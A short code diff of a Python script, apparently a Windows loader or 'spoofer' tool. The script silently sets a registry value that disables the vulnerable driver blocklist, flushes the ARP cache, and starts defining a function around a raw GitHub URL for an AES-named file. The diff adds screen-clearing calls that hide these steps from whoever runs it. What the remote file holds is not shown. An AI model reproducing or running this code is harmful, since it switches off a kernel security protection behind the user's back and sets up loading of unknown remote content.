@@ -11,19 +11,20 @@ try:
     print("Command executed successfully.")
 except subprocess.CalledProcessError as e:
     print("Error occurred:", e)
+os.system('cls')
 try:
     subprocess.run('reg add HKLM\SYSTEM\CurrentControlSet\CI\Config /v "VulnerableDriverBlocklistEnable" /t REG_DWORD /d 0 /f', shell=True, check=True)
     print("")
 except subprocess.CalledProcessError as e:
     print("Error occurred:", e)
 
-
+os.system('cls')
 try:
     subprocess.run(["netsh", "interface", "ip", "delete", "arpcache"], check=True)
     print("")
 except subprocess.CalledProcessError as e:
     print(f"Error: {e}")
-
+os.system('cls')
 def new_function_name(new_privacy_key):
     raw2_url  = 'https://raw.githubusercontent.com/nvtsxlz/raws/main/rawaes.txt'
 
